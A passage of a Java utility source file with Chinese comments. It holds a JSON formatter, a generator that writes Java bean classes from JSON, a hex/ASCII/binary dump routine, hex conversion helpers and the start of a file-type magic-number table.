
					Set<String> result = new HashSet<String>();
					result.addAll(itemSet);
					result.addAll(curSet);
					hashset.remove(curSet);
					hashset.add(result);
					flag = false;
				}
			}

			return flag;
		}

	}

	static class JsonFormat {

		/**
		 * 默认每次缩进两个空格
		 */
		private static final String empty = "  ";

		public static String format(String json) {
			try {
				json = removeUnUsedSpaces(json);
				int empty = 0;
				char[] chs = json.toCharArray();
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < chs.length;) {
					// 若是双引号，则为字符串，下面if语句会处理该字符串
					if (chs[i] == '\"') {

						stringBuilder.append(chs[i]);
						i++;
						// 查找字符串结束位置
						for (; i < chs.length;) {
							// 如果当前字符是双引号，且前面有连续的偶数个\，说明字符串结束
							if (chs[i] == '\"' && isDoubleSerialBackslash(chs, i - 1)) {
								stringBuilder.append(chs[i]);
								i++;
								break;
							} else {
								stringBuilder.append(chs[i]);
								i++;
							}

						}
					} else if (chs[i] == ',') {
						stringBuilder.append(',').append('\n').append(getEmpty(empty));

						i++;
					} else if (chs[i] == '{' || chs[i] == '[') {
						empty++;
						stringBuilder.append(chs[i]).append('\n').append(getEmpty(empty));

						i++;
					} else if (chs[i] == '}' || chs[i] == ']') {
						empty--;
						stringBuilder.append('\n').append(getEmpty(empty)).append(chs[i]);

						i++;
					} else {
						stringBuilder.append(chs[i]);
						i++;
					}

				}

				return stringBuilder.toString();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				return json;
			}

		}

		static boolean isDoubleSerialBackslash(char[] chs, int i) {
			int count = 0;
			for (int j = i; j > -1; j--) {
				if (chs[j] == '\\') {
					count++;
				} else {
					return count % 2 == 0;
				}
			}

			return count % 2 == 0;
		}

		/**
		 * 缩进
		 *
		 * @param count
		 * @return
		 */
		static String getEmpty(int count) {
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < count; i++) {
				stringBuilder.append(empty);
			}

			return stringBuilder.toString();
		}

		static String removeUnUsedSpaces(String json) {
			char[] chs = json.toCharArray();
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < chs.length;) {
				// 若是双引号，则为字符串，下面if语句会处理该字符串
				if (chs[i] == '\"') {

					stringBuilder.append(chs[i]);
					i++;
					// 查找字符串结束位置
					for (; i < chs.length;) {
						// 如果当前字符是双引号，且前面有连续的偶数个\，说明字符串结束
						if (chs[i] == '\"' && isDoubleSerialBackslash(chs, i - 1)) {
							stringBuilder.append(chs[i]);
							i++;
							break;
						} else {
							stringBuilder.append(chs[i]);
							i++;
						}

					}
				} else {

					if (chs[i] == ' ' || chs[i] == '\t' || chs[i] == '\n') {
						i++;
						continue;
					}

					stringBuilder.append(chs[i]);
					i++;
				}

			}

			return stringBuilder.toString();
		}

	}

	static String Rule17_OutJava_Dir_TimeStampStr = null;
	static String Rule17_OutRealJava_Path = null;

	public interface JsonParse {
		Map<String, Object> toMap(String json);

		List<Object> toArray(String json);
	}

	public static class MyBeanGenerator implements BeanGenerator {

		String packName;

		public MyBeanGenerator(String packName) {
			// TODO Auto-generated constructor stub
			this.packName = packName;
		}

		static String[] javaCode = { "abstract", "assert", "boolean", "break", "byte", "case", "catch", "char", "class",
				"const", "continue", "default", "do", "double", "else", "enum", "extends", "final", "finally", "float",
				"for", "goto", "if", "implements", "import", "instanceof", "int", "interface", "long", "native", "new",
				"package", "private", "protected", "public", "return", "strictfp", "short", "static", "super", "switch",
				"synchronized", "this", "throw", "throws", "transient", "try", "void", "volatile", "while" };

		static ArrayList<String> javaCodeArr = new ArrayList<String>();
		static {
			Collections.addAll(javaCodeArr, javaCode);
		}

		@Override
		public void writeBean(String className, Map<String, Object> map) throws IOException {
// Topic048.java  zzj               执行该类
			if (Rule17_OutJava_Dir_TimeStampStr == null) {
				Rule17_OutJava_Dir_TimeStampStr = getTimeStampLong() + "";
			}
			System.out.println(" MyBeanGenerator  className  =" + className);
			System.out.println("writeBean  className =" + className + "packName = " + packName);
			while (className.contains(" ")) {
				className = className.replaceAll(" ", "");
			}
			File file = new File(I9_OUT_DIR + File.separator + Rule17_OutJava_Dir_TimeStampStr + File.separator
					+ packName.replace(".", "/"));
			System.out.println("writeBean  file =" + file.getAbsolutePath());
			if (!file.exists() || file.exists() && file.isFile()) {
				file.mkdirs();
			}
			if (Rule17_OutRealJava_Path == null) {
				Rule17_OutRealJava_Path = file.getAbsolutePath();
			}
			File javaFile = new File(file, className + ".java");
			System.out.println("javaFIle Path = " + javaFile.getAbsolutePath());
			BufferedWriter bw = new BufferedWriter(new FileWriter(javaFile));
			bw.write("package ");
			bw.write(packName);
			bw.write(";\n");
			bw.write("import java.util.List;\n\n");

			bw.write("/**\n");
			bw.write(" *auto generate\n");
			bw.write(" *\n");
			bw.write(" *@author Zukgit\n");
			bw.write(" *\n");
			bw.write(" */\n");

			bw.write("public class ");
			bw.write(className);
			bw.write("{\n");
			map = sortMapByKey(map);
			Set<Map.Entry<String, Object>> set = map.entrySet();

			for (Map.Entry<String, Object> entry : set) {
				bw.write("    ");

				String value = entry.getValue().toString();
				System.out.println(" zvaluepre = " + value);
				if (value.contains("\\n")) {
					value = value.substring(0, value.indexOf("\\n"));
				}
				System.out.println(" zvalueback = " + value);
				if (value.contains("List") && value.contains("___")) {
					// List<A___B___C> == > List<Object>
					String pre = value.substring(0, value.indexOf("___") - 1);
					String back = value.substring(value.lastIndexOf("___") + "___".length() + 1, value.length());
					value = pre + "Object" + back; // List<AObject___B___C>
				}
				System.out.println(" zvalue = " + value);
				bw.write(value);
// entry.getValue().key = abstract
				System.out.println("X1  className  =" + className + " entry.getValue().toString() ="
						+ entry.getValue().toString() + " entry.getValue().key = " + entry.getKey());
				// X1 MyBeanGenerator className =RootBean entry.getValue().toString()
				// =List<A___B___C>\nA[1][2][3][4][5][6][7]
				bw.write(" ");
				String key = entry.getKey();
				if (javaCodeArr.contains(key)) {
					key = key + "_javacode";
				}
				bw.write(key);
				bw.write(";\n");
			}
			bw.write("\n");

			set = map.entrySet();

			for (Map.Entry<String, Object> entry : set) {

				bw.write("    public ");
				String value1 = entry.getValue().toString();
				System.out.println(" zvaluepre  value1 = " + value1);
				if (value1.contains("\\n")) {
					value1 = value1.substring(0, value1.indexOf("\\n"));
				}
				System.out.println(" zvalueback  value1 = " + value1);
				if (value1.contains("List") && value1.contains("___")) {
					// List<A___B___C> == > List<Object>
					String pre = value1.substring(0, value1.indexOf("___") - 1);
					String back = value1.substring(value1.lastIndexOf("___") + "___".length() + 1, value1.length());
					value1 = pre + "Object" + back; // List<AObject___C>
				}
				bw.write(value1);
				System.out.println(" zvalue1 = " + value1);
				// // entry.getValue().toString() = abstract
				System.out.println("X2  MyBeanGenerator  x2 className  =" + className + " entry.getValue().toString() ="
						+ entry.getValue().toString());
				bw.write(" get");
				String key = entry.getKey();
				if (javaCodeArr.contains(key)) {
					key = key + "_javacode";
				}

				// 如果 当前的 value 包含 List 和 ___ 那么获取 第一个 ___ 之前的位置 最后一个 ___之后的位置, 截取这个字符串 中间加
				// List<Object>

// entry.getValue().toString() =List<A_B_C>
				bw.write(capitalUpperCase(key));
				System.out.println("X3  MyBeanGenerator x3  className  =" + className + " entry.getValue().toString() ="
						+ entry.getValue().toString() + "  capitalUpperCase(entry.getKey()) ="
						+ capitalUpperCase(entry.getKey()));

				bw.write("(){\n");
				bw.write("        ");
				bw.write("return ");
				bw.write(key);

				bw.write(";\n    }\n\n");

				//////////////////////////

				bw.write("    public void ");
				bw.write("set"); // 设置方法

				String key_set = entry.getKey();
				if (javaCodeArr.contains(key_set)) {
					key_set = key_set + "_javacode";
				}

				bw.write(capitalUpperCase(key_set));

				bw.write("(");
				bw.write(value1);
				bw.write(" ");
				bw.write(key_set);
				bw.write("){\n");
				bw.write("        ");
				bw.write("this.");
				bw.write(key_set);
				bw.write("=");
				bw.write(key_set);
				bw.write(";\n    }\n");

				bw.write("\n");

			}
			bw.write("}");

			bw.close();
			System.out.println("javaFIle Path = " + javaFile.getAbsolutePath());

			rule17_resultFile_List.add(javaFile);
		}

		private String capitalUpperCase(String s) {
			char[] chs = s.toCharArray();
			if (chs[0] >= 'a' && chs[0] <= 'z') {
				chs[0] = (char) (chs[0] - 32);
			}
			return new String(chs);

		}

		@Override
		public void writeList(String list) throws IOException {

			System.out.println("className1  writeList  = " + list); // zzj
			File file = new File("src/" + packName.replace(".", "/"));
			if (!file.exists() || file.exists() && file.isFile()) {
				file.mkdirs();
			}

			BufferedWriter bw = new BufferedWriter(
					new FileWriter(new File(file, list.replaceAll("<|>", "_") + ".txt")));

			bw.write(list);
			bw.write(";");

			bw.close();

		}

		public Map<String, Object> sortMapByKey(Map<String, Object> oriMap) {

			Map<String, Object> sortedMap = new TreeMap<String, Object>(new Comparator<String>() {
				public int compare(String key1, String key2) {

					return key1.compareTo(key2);
				}
			});
			sortedMap.putAll(oriMap);
			return sortedMap;
		}

	}

	@SuppressWarnings("unchecked")
	public static void ShowMap_String_String(Map<String, String> mMapParam, String tag) {
		Map.Entry<String, String> entryItem;

		System.out.println(
				"════════════════════ Map<String,String> 大小:" + mMapParam.size() + " " + "════════════════════ ");
		int index = 0;
		if (mMapParam != null) {
			Iterator iterator = mMapParam.entrySet().iterator();
			while (iterator.hasNext()) {
				entryItem = (Map.Entry<String, String>) iterator.next();

				String key = entryItem.getKey(); // Map的Key
				String value = entryItem.getValue(); // Map的Value
				System.out.println("Map_index[" + index + "]  key=[" + key + "]   value=[" + value + "]");
				index++;
			}
		}
	}

	@SuppressWarnings("unchecked")
	public static void ShowMap_Int_ArrInt(Map<Integer, ArrayList<Integer>> mMapParam) {
		Map.Entry<Integer, ArrayList<Integer>> entryItem;
		int Firstindex = 0;
		if (mMapParam != null) {
			Iterator iterator = mMapParam.entrySet().iterator();
			while (iterator.hasNext()) {
				entryItem = (Map.Entry<Integer, ArrayList<Integer>>) iterator.next();
				Integer year = entryItem.getKey(); // Map的Key
				ArrayList<Integer> year_day = entryItem.getValue(); // Map的Value
				int SecondIndex = 0;
				System.out.println("========== MapIndex[" + Firstindex + "] " + year + "  =========");
				for (int i = 0; i < year_day.size(); i++) {
					System.out.println("MapIndex[" + Firstindex + "] ValueIndex=[" + SecondIndex + "]" + " key=[" + year
							+ "]  value=[" + year_day.get(i) + "] ");
					SecondIndex++;
				}
				Firstindex++;
			}
		}
	}

	public static class MyJsonParser implements JsonParse {

		@SuppressWarnings("unchecked")
		@Override
		public Map<String, Object> toMap(String json) {
			return JSON.parseObject(json, Map.class);
		}

		@Override
		public List<Object> toArray(String json) {
			return JSON.parseArray(json, Object.class);
		}

	}

	public static class MyNameGenerator implements NameGenerator {

		String names[] = { "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R",
				"S", "T", "U", "V", "W", "X", "Y", "Z", "AA", "BB", "CC", "DD", "EE", "FF", "GG", "HH", "JJ", "KK",
				"LL", "MM", "NN" };
		int posiiotn;

		MyNameGenerator(ArrayList<String> namekeyList) {

			String names[] = { "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R",
					"S", "T", "U", "V", "W", "X", "Y", "Z", "AA", "BB", "CC", "DD", "EE", "FF", "GG", "HH", "JJ", "KK",
					"LL", "MM", "NN" };

			String[] names_Arr = new String[namekeyList.size() + names.length];

			for (int i = 0; i < namekeyList.size(); i++) {
				names_Arr[i] = namekeyList.get(i);
			}

			for (int j = namekeyList.size(); j < names.length + namekeyList.size(); j++) {
				names_Arr[j] = names[j - namekeyList.size()];
			}

			this.names = names_Arr; // 初始化 名称

		}

		@Override
		public String nextName() {

			return names[posiiotn++];
		}

		// 字符串转换为ascii
		public static String StringToA(String content) {
			String result = "";
			int max = content.length();
			for (int i = 0; i < max; i++) {
				char c = content.charAt(i);
				int b = (int) c;
				result = result + b;
			}
			return result;
		}

		// ascii转换为string
		public static String AToString(int i) {
			return Character.toString((char) i);
		}

		@Override
		public String formatName(String name) {
			char[] chs = name.toCharArray();
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.append(chs[0]);
			System.out.println("chs[0] =" + +chs[0]);
			for (int i = 1; i < chs.length; i++) {
				System.out.println("chs[" + i + "] =" + +chs[i]);
				if (chs[i - 1] == '_') { // 如果当前查询是_ 那么就把后面的 转为大写 _ 对应的ACSII码 是 95
					if (!isNum(AToString(chs[i])) && ("" + AToString(chs[i])).matches("^[a-z,A-Z].*$")) {
						stringBuilder.append((char) (chs[i] - 32));
						System.out.println("test run!  +chs[i] =" + +chs[i]);
					} else {
						stringBuilder.append(chs[i]);
					}
				} else
					stringBuilder.append(chs[i]);
			}
			// String s = stringBuilder.toString().replace("_", "");
			String s = stringBuilder.toString();
			chs = s.toCharArray();
			if (chs[0] >= 'a' && chs[0] <= 'z') {
				chs[0] = (char) (chs[0] - 32);
			}

			return new String(chs);
		}

		public static boolean isNum(String str) {
			return str.matches("^[-+]?(([0-9]+)([.]([0-9]+))?|([.]([0-9]+))?)$");
		}

	}

	public interface NameGenerator {
		String nextName();

		/**
		 * 格式化标识符，驼峰式写法
		 *
		 * @param name
		 * @return
		 */
		String formatName(String name);
	}

	static boolean is16jinzhi(String s) {
		boolean is16jinzhi = false;
		String regex = "^[A-Fa-f0-9]+$";

		if (s.matches(regex)) {

//			System.out.println(s.toUpperCase() + "是16进制数");
			is16jinzhi = true;
		} else {

//			System.out.println(s.toUpperCase() + "不是16进制数");
			is16jinzhi = false;
		}

		return is16jinzhi;
	}

	static int calculStrCount(String src, char charTarget) {
		int count = 0;
		String curFixStr = src.trim();

		for (int i = 0; i < curFixStr.length(); i++) {
			char charitem = curFixStr.charAt(i);

			if (charitem == charTarget) {
				count++;
			}
		}

		return count;
	}

	static boolean isStartWith_lower_trim_InArr(ArrayList<String> strList, String strValue) {
		boolean isContain = false;
		if (strList == null || strList.size() == 0) {
			return isContain;
		}
		for (int i = 0; i < strList.size(); i++) {
			String strItem = strList.get(i).toLowerCase().trim();

			if (strItem.startsWith(strValue.toLowerCase().trim())) {
				return true;
			}

		}

		return isContain;
	}

	static String get12size(int i) {
		String result = "" + i;
		int padding = 12 - result.length();

		if (padding > 0) {

			for (int j = 0; j < padding; j++) {
				result = "0" + result;

			}

		}

		return result;

	}

	public static String dumpHexString(byte[] array, StringBuilder xBinarySB, StringBuilder xAsciiSB,
									   StringBuilder xHexSB) {
		if (array == null)
			return "(null)";
		return dumpHexString(array, 0, array.length, xBinarySB, xAsciiSB, xHexSB);
	}

	private final static char[] HEX_DIGITS = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D',
			'E', 'F' };
	private final static char[] HEX_LOWER_CASE_DIGITS = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b',
			'c', 'd', 'e', 'f' };

	static int byteIndex = 0;

	public static String dumpHexString(byte[] array, int offset, int length, StringBuilder mBinarySB,
									   StringBuilder mAsciiSB, StringBuilder mHexSB) {
		StringBuilder result = new StringBuilder();
		boolean isTooBig_Flag = false;

		if (array.length > 80000000) { // 在 这里 大于 12亿 导致 报错 大于 12亿 那么把result舍弃掉
			isTooBig_Flag = true;
		}

		System.out.println("mBinarySB.init.size = " + mBinarySB.length() + "   mAsciiSB.init.size=" + mAsciiSB.length()
				+ "     mHexSB.init.size=" + mHexSB.length() + "");
		// 24826448
		System.out.println("bytes.length = " + array.length + "   offset=" + offset + "     length=" + length + "");
		// bytes.length = 87241784 = 83M
		try {

			if (array == null)
				return "(null)";

			byte[] line = new byte[16];
			int lineIndex = 0;

			dumpHexString_result_append(isTooBig_Flag, result, "\n0x");
			dumpHexString_result_append(isTooBig_Flag, result, toHexString(offset));

			// 把 int offset 转为 10 进制 10位数值

			for (int i = offset; i < offset + length; i++) {
				if (lineIndex == 16) {
					dumpHexString_result_append(isTooBig_Flag, result, " ");
					ArrayList<Byte> byteList = new ArrayList<Byte>();
					for (int j = 0; j < 16; j++) {
						byteList.add(line[j]);
						if (j == 0) {
							dumpHexString_result_append(isTooBig_Flag, result, " ║ "); // 16进制结束后面 添加一个 竖线 分隔

						}
						if (line[j] >= ' ' && line[j] <= '~') {
							dumpHexString_result_append(isTooBig_Flag, result, new String(line, j, 1));
						} else {

							if (line[j] == 0x00) { // 0x00 NUL(null) 空字符 ●

								dumpHexString_result_append(isTooBig_Flag, result, "●");
							} else if (line[j] == 0x0A) { // 0x0A 换行符 ▲
								dumpHexString_result_append(isTooBig_Flag, result, "▲");
							} else if (line[j] == 0x0D) { // 0D-■ 回车
								dumpHexString_result_append(isTooBig_Flag, result, "■");
							} else if (line[j] == 0x09) { // 09 - ◆水平制表符 相当于 Tab
								dumpHexString_result_append(isTooBig_Flag, result, "◆");
							} else if (line[j] == 0x0B) { // 0x0B -┓ VT (vertical tab) 垂直制表符
								dumpHexString_result_append(isTooBig_Flag, result, "-");
							} else if (line[j] == 0x1F) { // █ 0x1F 单元分隔符
								dumpHexString_result_append(isTooBig_Flag, result, "█");
							} else if (line[j] == 0x0C) { // 0x0C ▼ FF (NP form feed, new page) 换页键
								dumpHexString_result_append(isTooBig_Flag, result, "▼");
							} else {
								dumpHexString_result_append(isTooBig_Flag, result, ".");
							}
						}
						if (j == 15) { // 最后字符显示一个分割线
							dumpHexString_result_append(isTooBig_Flag, result, "  ║ "); // 这里显示的是 字节信息
							for (int k = 0; k < byteList.size(); k++) {
								byte curByte = byteList.get(k);

								String targetChar = "";
								if (curByte >= ' ' && curByte <= '~') {
									targetChar = new String(line, k, 1);
								} else {
//	                                targetChar = ".";

									if (curByte == 0x00) {
//	                                    dumpHexString_result_append(isTooBig_Flag,result,"●");
										targetChar = "●";
									} else if (curByte == 0x0A) { // 0x0A 换行符 ▲
//	                                    dumpHexString_result_append(isTooBig_Flag,result,"♂");
										targetChar = "▲";
									} else if (curByte == 0x0D) { // 0D-■ 回车
//	                                    dumpHexString_result_append(isTooBig_Flag,result,"∠");
										targetChar = "■";
									} else if (curByte == 0x09) { // 09 - ◆水平制表符 相当于 Tab
										targetChar = "◆";
									} else if (curByte == 0x0B) { // 0x0B -┓ VT (vertical tab) 垂直制表符
										targetChar = "-";
									} else if (curByte == 0x1F) { // █ 0x1F 单元分隔符
										targetChar = "█";
									} else if (curByte == 0x0C) { // 0x0C ▼ FF (NP form feed, new page) 换页键
										targetChar = "▼";
									} else {
//	                                    dumpHexString_result_append(isTooBig_Flag,result,".");
										targetChar = ".";
									}

								}

								String byreStr = toHexString(curByte);
								if (!isTooBig_Flag) {
									mAsciiSB.append(targetChar);
								}

								if (k < 9) {

									dumpHexString_result_append(isTooBig_Flag, result,
											"【 0" + k + "-" + toHexStringNoTen(byteIndex) + "-"
													+ toTenString(byteIndex).trim() + "-" + byreStr + "-" + targetChar
													+ " 】 ");

								} else {
//									System.out.println("result.length="+result.length());   在 这里 大于 12亿 导致 报错

									if (result.length() > 1207959000) { // 在 这里 大于 12亿 导致 报错 大于 12亿 那么把result舍弃掉
										isTooBig_Flag = true;
										result = new StringBuilder();
									}

									dumpHexString_result_append(isTooBig_Flag, result,
											"【 " + k + "-" + toHexStringNoTen(byteIndex) + "-"
													+ toTenString(byteIndex).trim() + "-" + byreStr + "-" + targetChar
													+ " 】 ");
								}

//
								byteIndex++;
								dumpHexString_result_append(isTooBig_Flag, result, showByte(curByte, mBinarySB));
							}

						}
					}

					dumpHexString_result_append(isTooBig_Flag, result, "\n0x");
					mHexSB.append("\n");
					mBinarySB.append("\n");
					dumpHexString_result_append(isTooBig_Flag, result, toHexString(i));
					lineIndex = 0;
				}

				byte b = array[i];
				dumpHexString_result_append(isTooBig_Flag, result, " ");
				dumpHexString_result_append(isTooBig_Flag, result, (HEX_DIGITS[(b >>> 4) & 0x0F] + ""));
				dumpHexString_result_append(isTooBig_Flag, result, HEX_DIGITS[b & 0x0F] + "");

				mHexSB.append(" ");
				mHexSB.append(HEX_DIGITS[(b >>> 4) & 0x0F]);
				mHexSB.append(HEX_DIGITS[b & 0x0F]);

				line[lineIndex++] = b;
			}

			if (lineIndex != 0) { // if (lineIndex != 16) AOSP 中存在错误 无法打印 最后是 16个字节的情况
				int count = (16 - lineIndex) * 3;
				count++;
				for (int i = 0; i < count; i++) {
					dumpHexString_result_append(isTooBig_Flag, result, " ");
				}
				ArrayList<Byte> byteList = new ArrayList<Byte>();

				for (int i = 0; i < lineIndex; i++) {
					byteList.add(line[i]);
					if (i == 0) {
						dumpHexString_result_append(isTooBig_Flag, result, " ║ "); // 这里显示的是 字节信息
					}

					if (line[i] >= ' ' && line[i] <= '~') {
						dumpHexString_result_append(isTooBig_Flag, result, new String(line, i, 1));
					} else {
//	                    dumpHexString_result_append(isTooBig_Flag,result,".");

						if (line[i] == 0x00) {
							dumpHexString_result_append(isTooBig_Flag, result, "●");
						} else if (line[i] == 0x0A) { // 0x0A 换行符 ▲
							dumpHexString_result_append(isTooBig_Flag, result, "▲");
						} else if (line[i] == 0x0D) { // 0D-■回车
							dumpHexString_result_append(isTooBig_Flag, result, "■");
						} else if (line[i] == 0x09) { // 09 - ◆水平制表符 相当于 Tab
							dumpHexString_result_append(isTooBig_Flag, result, "◆");
						} else if (line[i] == 0x0B) { // 0x0B -┓ VT (vertical tab) 垂直制表符
							dumpHexString_result_append(isTooBig_Flag, result, "-");
						} else if (line[i] == 0x1F) { // █ 0x1F 单元分隔符
							dumpHexString_result_append(isTooBig_Flag, result, "█");
						} else if (line[i] == 0x0C) { // 0x0C ▼ FF (NP form feed, new page) 换页键
							dumpHexString_result_append(isTooBig_Flag, result, "▼");
						} else {
							dumpHexString_result_append(isTooBig_Flag, result, ".");
						}

					}

					if (i == lineIndex - 1) { // 最后字符显示一个分割线
						int paddingSize = 16 - lineIndex;
						for (int j = 0; j < paddingSize; j++) {
							dumpHexString_result_append(isTooBig_Flag, result, " ");
						}
						dumpHexString_result_append(isTooBig_Flag, result, "  ║ "); // 这里显示的是 字节信息

						for (int k = 0; k < byteList.size(); k++) {
							byte curByte = byteList.get(k);

							String targetChar = "";
							if (curByte >= ' ' && curByte <= '~') {
								targetChar = new String(line, k, 1);
							} else {
//	                            targetChar = ".";

								if (curByte == 0x00) {
									dumpHexString_result_append(isTooBig_Flag, result, "●");
								} else if (curByte == 0x0A) { // 0x0A 换行符 ▲
									targetChar = "▲";
								} else if (curByte == 0x0D) { // 0D-■ 回车
									targetChar = "■";
								} else if (curByte == 0x09) { // 09 - ◆水平制表符 相当于 Tab
									targetChar = "◆";
								} else if (curByte == 0x0B) { // 0x0B -┓ VT (vertical tab) 垂直制表符
									targetChar = "-";
								} else if (curByte == 0x1F) { // █ 0x1F 单元分隔符
									targetChar = "█";
								} else if (curByte == 0x0C) { // 0x0C ▼ FF (NP form feed, new page) 换页键
									targetChar = "▼";
								} else {
									targetChar = ".";
								}
							}

							String byreStr = toHexString(curByte);
							if (!isTooBig_Flag) {
								mAsciiSB.append(targetChar);
							}

							if (k < 9) {
								dumpHexString_result_append(isTooBig_Flag, result,
										"【 0" + k + "-" + toHexStringNoTen(byteIndex) + "-"
												+ toTenString(byteIndex).trim() + "-" + byreStr + "-" + targetChar
												+ " 】 ");
							} else {
								dumpHexString_result_append(isTooBig_Flag, result,
										"【 " + k + "-" + toHexStringNoTen(byteIndex) + "-"
												+ toTenString(byteIndex).trim() + "-" + byreStr + "-" + targetChar
												+ " 】 ");
							}
							byteIndex++;
							dumpHexString_result_append(isTooBig_Flag, result, showByte(curByte, mBinarySB));
						}
					}
				}
			}

			System.out.println("result.end.size=" + result.length() + " " + "mBinarySB.end.size = " + mBinarySB.length()
					+ "   mAsciiSB.end.size=" + mAsciiSB.length() + "     mHexSB.init.end=" + mHexSB.length() + "");

			System.out.println("bytes.length = " + array.length + "   offset=" + offset + "     length=" + length + "");
		} catch (Exception e) {
			// TODO: handle exception

			System.out.println("发生 异常 result.length = " + result.length());
		}

//		result.end.size=222218811 mBinarySB.end.size = 36103552   mAsciiSB.end.size=4477953     mHexSB.init.end=13713752
//		bytes.length = 4477960   offset=0     length=4477960
// 	    222218811/4477960=49.6      result.length=1207959533会报错   那么 判断 大于这个值 就舍弃 result
		System.out.println("result.end.size=" + result.length() + " " + "mBinarySB.end.size = " + mBinarySB.length()
				+ "   mAsciiSB.end.size=" + mAsciiSB.length() + "     mHexSB.init.end=" + mHexSB.length() + "");

		System.out.println("bytes.length = " + array.length + "   offset=" + offset + "     length=" + length + "");

		if (isTooBig_Flag) {
			result = new StringBuilder();
			dumpHexString_result_append(isTooBig_Flag, result,
					"该显示区块 字符串Length大于12亿 会上报 java.lang.OutOfMemoryError: Requested array size exceeds VM limit 决定不显示! ");
		}

		if (isTooBig_Flag) {

			mAsciiSB.append(
					"该显示区块 字符串Length大于12亿 会上报 java.lang.OutOfMemoryError: Requested array size exceeds VM limit 决定不显示! ");
		}

		return result.toString();
	}

	static void dumpHexString_result_append(boolean isBig, StringBuilder sb, String str) {
		if (isBig) {
			return;
		}

		sb.append(str);

	}

	public static String showByte(byte byteData, StringBuilder mBinarySB) {
		StringBuilder sb = new StringBuilder();
		String result = "";

		for (int i = 7; i >= 0; i--) {

			byte tempByte = byteData;
			tempByte = (byte) (tempByte >> i);
			int value = tempByte & 0x01;
			if (value == 1) {
				sb.append("1");
				mBinarySB.append("1");
			} else {
				sb.append("0");
				mBinarySB.append("0");
			}

			if (i == 4) {
				sb.append("║");
			}
		}

		return sb.toString() + " ";

	}

	public static String toHexString(int i) {
		StringBuilder sb = new StringBuilder();
		sb.append(toHexString(toByteArray(i)));
		sb.append(toTenString(i));

		return sb.toString();
	}

	public static String toHexStringNoTen(int i) {
		StringBuilder sb = new StringBuilder();
		sb.append(toHexString(toByteArray(i)));
		return "0x" + sb.toString().trim();
	}

	public static String toHexString(byte b) {
		return toHexString(toByteArray(b));
	}

	public static String toHexString(byte[] array) {
		return toHexString(array, 0, array.length, true);
	}

	public static String toHexString(byte[] array, boolean upperCase) {
		return toHexString(array, 0, array.length, upperCase);
	}

	public static String toHexString(byte[] array, int offset, int length) {
		return toHexString(array, offset, length, true);
	}

	public static String toHexString(byte[] array, int offset, int length, boolean upperCase) {
		char[] digits = upperCase ? HEX_DIGITS : HEX_LOWER_CASE_DIGITS;
		char[] buf = new char[length * 2];

		int bufIndex = 0;
		for (int i = offset; i < offset + length; i++) {
			byte b = array[i];
			buf[bufIndex++] = digits[(b >>> 4) & 0x0F];
			buf[bufIndex++] = digits[b & 0x0F];
		}

		return new String(buf);
	}

	public static byte[] toByteArray(byte b) {
		byte[] array = new byte[1];
		array[0] = b;
		return array;
	}

	public static byte[] toByteArray(int i) {
		byte[] array = new byte[4];

		array[3] = (byte) (i & 0xFF);
		array[2] = (byte) ((i >> 8) & 0xFF);
		array[1] = (byte) ((i >> 16) & 0xFF);
		array[0] = (byte) ((i >> 24) & 0xFF);

		return array;
	}

	private static int toByte(char c) {
		if (c >= '0' && c <= '9')
			return (c - '0');
		if (c >= 'A' && c <= 'F')
			return (c - 'A' + 10);
		if (c >= 'a' && c <= 'f')
			return (c - 'a' + 10);

		throw new RuntimeException("Invalid hex char '" + c + "'");
	}

	public static byte[] hexStringToByteArray(String hexString) {
		int length = hexString.length();
		byte[] buffer = new byte[length / 2];

		for (int i = 0; i < length; i += 2) {
			buffer[i / 2] = (byte) ((toByte(hexString.charAt(i)) << 4) | toByte(hexString.charAt(i + 1)));
		}

		return buffer;
	}

	public static StringBuilder appendByteAsHex(StringBuilder sb, byte b, boolean upperCase) {
		char[] digits = upperCase ? HEX_DIGITS : HEX_LOWER_CASE_DIGITS;
		sb.append(digits[(b >> 4) & 0xf]);
		sb.append(digits[b & 0xf]);
		return sb;
	}

	public static String toTenString(int i) {
		String str = i + "";
		int length = str.length();
		if (length < 10) {
			int paddingSize = 10 - length;

			for (int j = 0; j < paddingSize; j++) {
				str = "0" + str;
			}
		}
		str = " " + str;
		// System.out.println(" 10进制 = "+ str);
		return str;
	}

	static byte[] tryFile2Byte(File target) {
		InputStream input = null;

		int lengthSize;
		byte[] buffer = null;
		// 创建输入输出流对象
		try {
			input = new FileInputStream(target);

			// 获取文件长度
			try {
				lengthSize = input.available();
				// 创建缓存区域
				buffer = new byte[lengthSize];
				// 将文件中的数据写入缓存数组
				input.read(buffer);
				// 将缓存数组中的数据输出到文件

			} catch (IOException e) {

				e.printStackTrace();
			}

		} catch (Exception e) {

		} finally {
			if (input != null) {
				try {
					input.close(); // 关闭流
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		return buffer;
	}

	static HashMap<String, String> mFileTypes;

	// 魔数
	static void initMoShuTypeMap() {
		mFileTypes = new HashMap<String, String>();
		// images
		initMoshuTypeItem("FFD8FF", "jpg");
		initMoshuTypeItem("89504E47", "png");
		initMoshuTypeItem("47494638", "gif");
		initMoshuTypeItem("49492A00", "tif");
		initMoshuTypeItem("424D", "bmp");
		initMoshuTypeItem("424D", "bmp");
		initMoshuTypeItem("424D228C010000000000", "bmp"); // 16色位图(bmp)
		initMoshuTypeItem("424D8240090000000000", "bmp"); // 24色位图(bmp)
		initMoshuTypeItem("424D8E1B030000000000", "bmp"); // 256色位图(bmp)

		initMoshuTypeItem("0a0d0d0a", "pcapng"); // CAD

		//
		initMoshuTypeItem("41433130", "dwg"); // CAD
		initMoshuTypeItem("38425053", "psd");
		initMoshuTypeItem("7B5C727466", "rtf"); // 日记本
		initMoshuTypeItem("7B5C7274", "rtf"); // 日记本

		initMoshuTypeItem("3C3F786D6C", "xml");
		initMoshuTypeItem("3C3F786D", "xml");

		initMoshuTypeItem("68746D6C3E", "html");
		initMoshuTypeItem("68746D6C", "html");

		initMoshuTypeItem("44656C69766572792D646174653A", "eml"); // 邮件
		initMoshuTypeItem("44656C69", "eml"); // 邮件

